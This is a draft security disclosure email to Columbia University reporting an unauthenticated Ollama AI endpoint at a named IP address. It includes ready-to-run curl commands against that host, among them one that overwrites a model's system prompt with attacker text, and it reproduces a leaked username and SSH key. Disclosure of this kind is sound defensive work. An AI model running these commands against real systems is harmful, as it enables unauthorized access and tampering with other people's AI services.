---
institution: Columbia University
ip: 128.59.106.97
to: security@columbia.edu
severity: CRITICAL
status: DRAFT
date: 2026-05-01
---

**To:** security@columbia.edu
**Subject:** Unauthenticated AI inference endpoint — Columbia University (128.59.106.97)

---

Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com

2026-05-01

**Re:** Unauthenticated Ollama AI inference endpoint — Columbia University
**IP / Host:** 128.59.106.97
**Severity:** CRITICAL

---

I'm an independent security researcher. I hold CISA disclosures CVE-2025-4364 and ICSA-25-140-11 and conduct good-faith AI infrastructure research under the NuClide Research umbrella. This is an unsolicited disclosure — no engagement exists with your organization, and I have not accessed, modified, or exfiltrated any data beyond what was necessary to confirm the exposure.

---

## Summary

Columbia University server running Open WebUI v0.8.12 (auth enabled) with raw Ollama API (port 11434) exposed to the public internet. One active cloud proxy subscription (DeepSeek) accessible without authentication. Cloud proxy 401 response leaks Ollama Connect username and SSH public key.

---

## Infrastructure

| Field | Value |
|---|---|
| IP | 128.59.106.97 |
| rDNS | dyn-128-59-106-97.dyn.columbia.edu |
| Org | Columbia University |
| Country | US — New York |
| Open ports | 3000 (Open WebUI), 11434 (Ollama — **public**) |

---

## Models

| Model | Size | Type |
|---|---|---|
| deepseek-v4-pro:cloud | 0 GB | ☁️ Cloud proxy — DeepSeek API |
| qwen2.5:7b | 4 GB | Local |
| qwen2.5:32b-instruct-q4_K_M | 18 GB | Local |
| qwen2.5:14b | 8 GB | Local |
| qwen2.5:14b-instruct-q4_K_M | 8 GB | Local |
| llama3.2-vision:latest | 7 GB | Local |

---

## Findings

### F1 — Unauthenticated Ollama API (CRITICAL)

Open WebUI auth on port 3000 does not protect raw Ollama port 11434.

```bash
curl http://128.59.106.97:11434/api/tags          # model list — no auth
curl http://128.59.106.97:11434/api/show -d '{"model":"qwen2.5:32b-instruct-q4_K_M"}'
# model injection (CVE-2025-63389):
curl -X POST http://128.59.106.97:11434/api/create \
  -d '{"model":"qwen2.5:7b","from":"qwen2.5:7b","system":"[attacker prompt]"}'
```

### F2 — Cloud Proxy Credential Leak (HIGH)

DeepSeek cloud proxy returns 401 with Ollama Connect credentials in response body:

```json
{
  "error": "unauthorized",
  "signin_url": "https://ollama.com/connect?name=seascvn066&key=<base64>"
}
```

Decoded:
- **Username:** `seascvn066`
- **SSH pubkey:** `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMgKyjVvSEr13H03652CBNEckNUiTj/xgh8i5vKcxO4`

---

**Why it matters**

The credential leak (username + SSH public key) exposes your service account to enumeration and credential-stuffing against other services.

**One-line fix**

```
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

This rebinds Ollama to loopback only. If running in Docker: `docker run -p 127.0.0.1:11434:11434 ollama/ollama`.

**CVE-2025-63389**

All models on this instance are injectable via the unauthenticated `/api/create` endpoint — an attacker can overwrite any model's system prompt or delete models entirely. No patch exists as of this disclosure.

**Reference**

Full technical details, parameter counts, and remediation notes are in this public research repository:
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT/blob/main/case-studies/universities/US/NY-columbia.md

This research is part of a broader sweep of university AI infrastructure exposures documented at:
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT/blob/main/case-studies/universities/OVERVIEW.md

I'm happy to answer questions or assist with verification. No response is required.

Regards,
Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT
